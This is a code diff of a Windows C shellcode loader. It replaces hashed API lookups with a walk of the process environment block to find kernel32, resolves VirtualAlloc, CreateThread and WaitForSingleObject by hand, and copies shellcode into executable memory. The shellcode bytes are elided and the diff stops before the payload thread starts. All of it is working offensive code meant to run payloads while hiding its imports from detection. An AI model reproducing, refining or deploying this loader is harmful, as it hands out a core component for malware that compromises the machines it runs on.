@@ -1,54 +1,67 @@
 #include <Windows.h>
+#include <winternl.h>
+
+typedef HMODULE(WINAPI* PGetModuleHandleA)(PCSTR);
+typedef FARPROC(WINAPI* PGetProcAddress)(HMODULE, PCSTR);
 
 typedef PVOID(WINAPI* PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
 typedef PVOID(WINAPI* PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
 typedef PVOID(WINAPI* PWaitForSingleObject)(HANDLE, DWORD);
 
-unsigned int hash(const char* str)
-{
-	unsigned int hash = 7759;
-	int c;
-
-	while (c = *str++)
-		hash = ((hash << 5) + hash) + c;
-
-	return hash;
-}
-
 void main()
 {
-	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
-	PVirtualAlloc funcVirtualAlloc;
-	PCreateThread funcCreateThread;
-	PWaitForSingleObject funcWaitForSingleObject;
+	PPEB pPEB = (PPEB)__readgsqword(0x60);
+	PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
+	PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
+	PLIST_ENTRY listCurrent = listHead->Flink;
+	PVOID kernel32Address;
+	do
+	{
+		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+		DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
+		PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
+		WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
+		CharUpperA(dllName);
+		if (strstr(dllName, "KERNEL32.DLL"))
+		{
+			kernel32Address = dllEntry->DllBase;
+			HeapFree(GetProcessHeap(), 0, dllName);
+			break;
+		}
+		HeapFree(GetProcessHeap(), 0, dllName);
+		listCurrent = listCurrent->Flink;
+	} while (listCurrent != listHead);
 
-	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hKernel32;
-	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hKernel32 + pDosHeader->e_lfanew);
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32Address;
+	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)kernel32Address + pDosHeader->e_lfanew);
 	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
-	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hKernel32 + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-	PULONG pAddressOfFunctions = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfFunctions);
-	PULONG pAddressOfNames = (PULONG)((PBYTE)hKernel32 + pExportDirectory->AddressOfNames);
-	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)hKernel32 + pExportDirectory->AddressOfNameOrdinals);
+	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32Address + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+	PULONG pAddressOfFunctions = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfFunctions);
+	PULONG pAddressOfNames = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfNames);
+	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)kernel32Address + pExportDirectory->AddressOfNameOrdinals);
+
+	PGetModuleHandleA pGetModuleHandleA = NULL;
+	PGetProcAddress pGetProcAddress = NULL;
 
 	for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
 	{
-		PCSTR pFunctionName = (PSTR)((PBYTE)hKernel32 + pAddressOfNames[i]);
-		if (hash(pFunctionName) == 0x80fa57e1)
+		PCSTR pFunctionName = (PSTR)((PBYTE)kernel32Address + pAddressOfNames[i]);
+		if (!strcmp(pFunctionName, "GetModuleHandleA"))
 		{
-			funcVirtualAlloc = (PVirtualAlloc)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+			pGetModuleHandleA = (PGetModuleHandleA)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
 		}
-		if (hash(pFunctionName) == 0xc7d73c9b)
+		if (!strcmp(pFunctionName, "GetProcAddress"))
 		{
-			funcCreateThread = (PCreateThread)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
-		}
-		if (hash(pFunctionName) == 0x50c272c4)
-		{
-			funcWaitForSingleObject = (PWaitForSingleObject)((PBYTE)hKernel32 + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+			pGetProcAddress = (PGetProcAddress)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
 		}
 	}
 
-	unsigned char shellcode[] = "\\xfc\\x48\\x83";
+	HMODULE hKernel32 = pGetModuleHandleA("kernel32.dll");
+	PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)pGetProcAddress(hKernel32, "VirtualAlloc");
+	PCreateThread funcCreateThread = (PCreateThread)pGetProcAddress(hKernel32, "CreateThread");
+	PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)pGetProcAddress(hKernel32, "WaitForSingleObject");
 
+	unsigned char shellcode[] = "\\xfc\\x48\\x83 (...) ";
 	PVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	memcpy(shellcode_exec, shellcode, sizeof shellcode);
 	DWORD threadID;
